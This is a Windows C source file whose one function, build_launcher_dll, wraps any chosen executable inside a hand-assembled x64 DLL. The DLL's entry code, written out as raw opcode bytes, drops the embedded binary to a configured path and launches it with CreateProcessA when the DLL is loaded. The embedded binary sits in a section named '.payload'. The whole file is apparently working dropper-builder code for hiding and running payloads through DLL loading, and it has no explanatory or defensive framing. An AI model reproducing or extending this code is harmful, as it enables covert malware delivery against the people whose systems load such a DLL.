#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    struct RelPatch {
        size_t pos;
        int kind;
    } patches[32];

    const char drop_path[] = DROP_PATH;
    static const char *const import_names[] = {
        "CreateFileA",
        "WriteFile",
        "CloseHandle",
        "CreateProcessA"
    };
    static const char import_dll[] = "KERNEL32.dll";

    FILE *input = NULL;
    FILE *output = NULL;
    unsigned char *binary = NULL;
    unsigned char *image = NULL;
    unsigned char code[512];
    size_t binary_size = 0;
    size_t section_used = 0;
    size_t section_raw_size = 0;
    size_t reloc_raw_offset = 0;
    size_t total_size = 0;
    size_t drop_offset = 0;
    size_t command_offset = 0;
    size_t binary_offset = 0;
    size_t import_desc_offset = 0;
    size_t ilt_offset = 0;
    size_t iat_offset = 0;
    size_t import_dll_offset = 0;
    size_t hint_name_offsets[4];
    size_t code_size = 0;
    size_t patch_count = 0;
    size_t i;
    size_t cp = 0;
    size_t return_offset = 0;
    size_t process_offset = 0;
    size_t image_headers_size = 0x200;
    uint32_t section_rva = 0x1000;
    uint32_t reloc_rva = 0;
    uint32_t section_raw_offset = 0x200;
    uint32_t reloc_raw_size = 0x200;
    uint32_t image_size = 0;
    int result = -1;
    int64_t input_length;
    DWORD read_count;
    uint32_t zero32;
    uint64_t zero64;

    if (binary_path == NULL || dll_out_path == NULL)
        return -1;

    input = fopen(binary_path, "rb");
    if (input == NULL)
        goto cleanup;

    if (_fseeki64(input, 0, SEEK_END) != 0)
        goto cleanup;
    input_length = _ftelli64(input);
    if (input_length < 0 || (uint64_t)input_length > UINT32_MAX)
        goto cleanup;
    if (_fseeki64(input, 0, SEEK_SET) != 0)
        goto cleanup;

    binary_size = (size_t)input_length;
    binary = (unsigned char *)malloc(binary_size != 0 ? binary_size : 1);
    if (binary == NULL)
        goto cleanup;

    {
        size_t remaining = binary_size;
        size_t offset = 0;
        while (remaining != 0) {
            size_t chunk = remaining > 0x100000 ? 0x100000 : remaining;
            read_count = (DWORD)fread(binary + offset, 1, chunk, input);
            if (read_count != chunk)
                goto cleanup;
            offset += chunk;
            remaining -= chunk;
        }
    }

    if (fclose(input) != 0) {
        input = NULL;
        goto cleanup;
    }
    input = NULL;

#define EMIT8(v) do { code[cp++] = (uint8_t)(v); } while (0)
#define EMIT32(v) do { uint32_t emit_value_ = (uint32_t)(v); memcpy(code + cp, &emit_value_, sizeof(emit_value_)); cp += sizeof(emit_value_); } while (0)
#define EMIT_REL(k) do { patches[patch_count].pos = cp; patches[patch_count].kind = (k); EMIT32(0); ++patch_count; } while (0)

    EMIT8(0x48); EMIT8(0x81); EMIT8(0xEC); EMIT32(0xD8);
    EMIT8(0x83); EMIT8(0xFA); EMIT8(0x01);
    EMIT8(0x0F); EMIT8(0x85); EMIT_REL(1);

    EMIT8(0x48); EMIT8(0x8D); EMIT8(0x0D); EMIT_REL(3);
    EMIT8(0xBA); EMIT32(0xC0000000u);
    EMIT8(0x45); EMIT8(0x31); EMIT8(0xC0);
    EMIT8(0x4D); EMIT8(0x31); EMIT8(0xC9);
    EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x20); EMIT32(CREATE_ALWAYS);
    EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x28); EMIT32(FILE_ATTRIBUTE_NORMAL);
    EMIT8(0x48); EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x30); EMIT32(0);
    EMIT8(0xFF); EMIT8(0x15); EMIT_REL(10);

    EMIT8(0x48); EMIT8(0x89); EMIT8(0x44); EMIT8(0x24); EMIT8(0x40);
    EMIT8(0x48); EMIT8(0x83); EMIT8(0xF8); EMIT8(0xFF);
    EMIT8(0x0F); EMIT8(0x84); EMIT_REL(2);

    EMIT8(0x48); EMIT8(0x8B); EMIT8(0x4C); EMIT8(0x24); EMIT8(0x40);
    EMIT8(0x48); EMIT8(0x8D); EMIT8(0x15); EMIT_REL(5);
    EMIT8(0x41); EMIT8(0xB8); EMIT32(binary_size);
    EMIT8(0x4C); EMIT8(0x8D); EMIT8(0x4C); EMIT8(0x24); EMIT8(0x48);
    EMIT8(0x48); EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x20); EMIT32(0);
    EMIT8(0xFF); EMIT8(0x15); EMIT_REL(11);

    EMIT8(0x48); EMIT8(0x8B); EMIT8(0x4C); EMIT8(0x24); EMIT8(0x40);
    EMIT8(0xFF); EMIT8(0x15); EMIT_REL(12);

    process_offset = cp;

    EMIT8(0x31); EMIT8(0xC0);
    for (i = 0x50; i <= 0xB0; i += 8) {
        if (i <= 0x7F) {
            EMIT8(0x48); EMIT8(0x89); EMIT8(0x44); EMIT8(0x24); EMIT8(i);
        } else {
            EMIT8(0x48); EMIT8(0x89); EMIT8(0x84); EMIT8(0x24); EMIT32(i);
        }
    }
    for (i = 0xB8; i <= 0xC8; i += 8) {
        EMIT8(0x48); EMIT8(0x89); EMIT8(0x84); EMIT8(0x24); EMIT32(i);
    }
    EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x50); EMIT32(sizeof(STARTUPINFOA));

    EMIT8(0x48); EMIT8(0x8D); EMIT8(0x0D); EMIT_REL(3);
    EMIT8(0x48); EMIT8(0x8D); EMIT8(0x15); EMIT_REL(4);
    EMIT8(0x45); EMIT8(0x31); EMIT8(0xC0);
    EMIT8(0x4D); EMIT8(0x31); EMIT8(0xC9);
    for (i = 0x20; i <= 0x38; i += 8) {
        EMIT8(0x48); EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(i); EMIT32(0);
    }
    EMIT8(0x48); EMIT8(0x8D); EMIT8(0x44); EMIT8(0x24); EMIT8(0x50);
    EMIT8(0x48); EMIT8(0x89); EMIT8(0x44); EMIT8(0x24); EMIT8(0x40);
    EMIT8(0x48); EMIT8(0x8D); EMIT8(0x84); EMIT8(0x24); EMIT32(0xB8);
    EMIT8(0x48); EMIT8(0x89); EMIT8(0x44); EMIT8(0x24); EMIT8(0x48);
    EMIT8(0xFF); EMIT8(0x15); EMIT_REL(13);

    return_offset = cp;
    EMIT8(0xB8); EMIT32(1);
    EMIT8(0x48); EMIT8(0x81); EMIT8(0xC4); EMIT32(0xD8);
    EMIT8(0xC3);

    code_size = cp;
    if (code_size > sizeof(code) || patch_count > sizeof(patches) / sizeof(patches[0]))
        goto cleanup;

    drop_offset = (code_size + 7u) & ~(size_t)7u;
    if (drop_offset > SIZE_MAX - sizeof(drop_path))
        goto cleanup;
    command_offset = (drop_offset + sizeof(drop_path) + 7u) & ~(size_t)7u;
    if (command_offset > SIZE_MAX - sizeof(drop_path))
        goto cleanup;
    binary_offset = (command_offset + sizeof(drop_path) + 7u) & ~(size_t)7u;
    if (binary_offset > SIZE_MAX - binary_size)
        goto cleanup;
    import_desc_offset = (binary_offset + binary_size + 7u) & ~(size_t)7u;
    if (import_desc_offset > SIZE_MAX - 40u)
        goto cleanup;
    ilt_offset = import_desc_offset + 40u;
    if (ilt_offset > SIZE_MAX - 40u)
        goto cleanup;
    iat_offset = ilt_offset + 40u;
    if (iat_offset > SIZE_MAX - 40u)
        goto cleanup;
    import_dll_offset = iat_offset + 40u;
    if (import_dll_offset > SIZE_MAX - sizeof(import_dll))
        goto cleanup;

    section_used = import_dll_offset + sizeof(import_dll);
    for (i = 0; i < 4; ++i) {
        size_t name_length = strlen(import_names[i]) + 1;
        section_used = (section_used + 1u) & ~(size_t)1u;
        hint_name_offsets[i] = section_used;
        if (section_used > SIZE_MAX - sizeof(WORD) - name_length)
            goto cleanup;
        section_used += sizeof(WORD) + name_length;
    }

    if (section_used > UINT32_MAX || section_used > SIZE_MAX - 0x1FFu)
        goto cleanup;
    section_raw_size = (section_used + 0x1FFu) & ~(size_t)0x1FFu;
    if (section_raw_size > UINT32_MAX)
        goto cleanup;

    reloc_rva = (uint32_t)(((uint64_t)section_rva + section_used + 0xFFFu) & ~UINT64_C(0xFFF));
    if ((uint64_t)reloc_rva + 0x1000u > UINT32_MAX)
        goto cleanup;
    image_size = (uint32_t)(((uint64_t)reloc_rva + 8u + 0xFFFu) & ~UINT64_C(0xFFF));

    reloc_raw_offset = section_raw_offset + section_raw_size;
    if (reloc_raw_offset > SIZE_MAX - reloc_raw_size)
        goto cleanup;
    total_size = reloc_raw_offset + reloc_raw_size;

    image = (unsigned char *)calloc(1, total_size);
    if (image == NULL)
        goto cleanup;

    memcpy(image + section_raw_offset, code, code_size);
    memcpy(image + section_raw_offset + drop_offset, drop_path, sizeof(drop_path));
    memcpy(image + section_raw_offset + command_offset, drop_path, sizeof(drop_path));
    if (binary_size != 0)
        memcpy(image + section_raw_offset + binary_offset, binary, binary_size);

    for (i = 0; i < 4; ++i) {
        WORD hint = 0;
        uint64_t thunk = (uint64_t)(section_rva + (uint32_t)hint_name_offsets[i]);
        size_t name_length = strlen(import_names[i]) + 1;
        memcpy(image + section_raw_offset + hint_name_offsets[i], &hint, sizeof(hint));
        memcpy(image + section_raw_offset + hint_name_offsets[i] + sizeof(hint),
               import_names[i], name_length);
        memcpy(image + section_raw_offset + ilt_offset + i * sizeof(uint64_t),
               &thunk, sizeof(thunk));
        memcpy(image + section_raw_offset + iat_offset + i * sizeof(uint64_t),
               &thunk, sizeof(thunk));
    }

    {
        IMAGE_IMPORT_DESCRIPTOR descriptor;
        memset(&descriptor, 0, sizeof(descriptor));
        descriptor.OriginalFirstThunk = section_rva + (uint32_t)ilt_offset;
        descriptor.Name = section_rva + (uint32_t)import_dll_offset;
        descriptor.FirstThunk = section_rva + (uint32_t)iat_offset;
        memcpy(image + section_raw_offset + import_desc_offset, &descriptor, sizeof(descriptor));
        memcpy(image + section_raw_offset + import_dll_offset, import_dll, sizeof(import_dll));
    }

    for (i = 0; i < patch_count; ++i) {
        size_t target;
        int64_t displacement;

        switch (patches[i].kind) {
        case 1:
            target = return_offset;
            break;
        case 2:
            target = process_offset;
            break;
        case 3:
            target = drop_offset;
            break;
        case 4:
            target = command_offset;
            break;
        case 5:
            target = binary_offset;
            break;
        case 10:
            target = iat_offset;
            break;
        case 11:
            target = iat_offset + sizeof(uint64_t);
            break;
        case 12:
            target = iat_offset + 2u * sizeof(uint64_t);
            break;
        case 13:
            target = iat_offset + 3u * sizeof(uint64_t);
            break;
        default:
            goto cleanup;
        }

        displacement = (int64_t)target - (int64_t)(patches[i].pos + sizeof(uint32_t));
        if (displacement < INT32_MIN || displacement > INT32_MAX)
            goto cleanup;
        {
            int32_t rel = (int32_t)displacement;
            memcpy(image + section_raw_offset + patches[i].pos, &rel, sizeof(rel));
        }
    }

    {
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)image;
        IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(image + 0x80);
        IMAGE_SECTION_HEADER *sections;
        IMAGE_SECTION_HEADER *payload_section;
        IMAGE_SECTION_HEADER *reloc_section;
        IMAGE_BASE_RELOCATION *base_reloc;

        dos->e_magic = IMAGE_DOS_SIGNATURE;
        dos->e_lfanew = 0x80;

        memset(nt, 0, sizeof(*nt));
        nt->Signature = IMAGE_NT_SIGNATURE;
        nt->FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64;
        nt->FileHeader.NumberOfSections = 2;
        nt->FileHeader.SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER64);
        nt->FileHeader.Characteristics = IMAGE_FILE_EXECUTABLE_IMAGE |
                                         IMAGE_FILE_DLL |
                                         IMAGE_FILE_LARGE_ADDRESS_AWARE;

        nt->OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
        nt->OptionalHeader.MajorLinkerVersion = 14;
        nt->OptionalHeader.AddressOfEntryPoint = section_rva;
        nt->OptionalHeader.BaseOfCode = section_rva;
        nt->OptionalHeader.ImageBase = UINT64_C(0x180000000);
        nt->OptionalHeader.SectionAlignment = 0x1000;
        nt->OptionalHeader.FileAlignment = 0x200;
        nt->OptionalHeader.MajorOperatingSystemVersion = 6;
        nt->OptionalHeader.MajorSubsystemVersion = 6;
        nt->OptionalHeader.SizeOfImage = image_size;
        nt->OptionalHeader.SizeOfHeaders = (DWORD)image_headers_size;
        nt->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
        nt->OptionalHeader.DllCharacteristics = IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE |
                                                 IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
        nt->OptionalHeader.SizeOfStackReserve = 0x100000;
        nt->OptionalHeader.SizeOfStackCommit = 0x1000;
        nt->OptionalHeader.SizeOfHeapReserve = 0x100000;
        nt->OptionalHeader.SizeOfHeapCommit = 0x1000;
        nt->OptionalHeader.NumberOfRvaAndSizes = IMAGE_NUMBEROF_DIRECTORY_ENTRIES;
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress =
            section_rva + (DWORD)import_desc_offset;
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = 40;
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress =
            section_rva + (DWORD)iat_offset;
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size = 40;
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = reloc_rva;
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = sizeof(IMAGE_BASE_RELOCATION);

        sections = (IMAGE_SECTION_HEADER *)((unsigned char *)&nt->OptionalHeader +
                                             nt->FileHeader.SizeOfOptionalHeader);
        payload_section = &sections[0];
        reloc_section = &sections[1];

        memset(payload_section, 0, sizeof(*payload_section));
        memcpy(payload_section->Name, ".payload", 8);
        payload_section->Misc.VirtualSize = (DWORD)section_used;
        payload_section->VirtualAddress = section_rva;
        payload_section->SizeOfRawData = (DWORD)section_raw_size;
        payload_section->PointerToRawData = section_raw_offset;
        payload_section->Characteristics = IMAGE_SCN_CNT_CODE |
                                           IMAGE_SCN_CNT_INITIALIZED_DATA |
                                           IMAGE_SCN_MEM_EXECUTE |
                                           IMAGE_SCN_MEM_READ |
                                           IMAGE_SCN_MEM_WRITE;

        memset(reloc_section, 0, sizeof(*reloc_section));
        memcpy(reloc_section->Name, ".reloc", 6);
        reloc_section->Misc.VirtualSize = sizeof(IMAGE_BASE_RELOCATION);
        reloc_section->VirtualAddress = reloc_rva;
        reloc_section->SizeOfRawData = reloc_raw_size;
        reloc_section->PointerToRawData = (DWORD)reloc_raw_offset;
        reloc_section->Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA |
                                         IMAGE_SCN_MEM_READ |
                                         IMAGE_SCN_MEM_DISCARDABLE;

        base_reloc = (IMAGE_BASE_RELOCATION *)(image + reloc_raw_offset);
        base_reloc->VirtualAddress = 0;
        base_reloc->SizeOfBlock = sizeof(IMAGE_BASE_RELOCATION);
    }

    output = fopen(dll_out_path, "wb");
    if (output == NULL)
        goto cleanup;
    if (fwrite(image, 1, total_size, output) != total_size)
        goto cleanup;
    if (fclose(output) != 0) {
        output = NULL;
        goto cleanup;
    }
    output = NULL;
    result = 0;

cleanup:
    if (input != NULL)
        fclose(input);
    if (output != NULL)
        fclose(output);
    free(image);
    free(binary);
    return result;

#undef EMIT8
#undef EMIT32
#undef EMIT_REL
}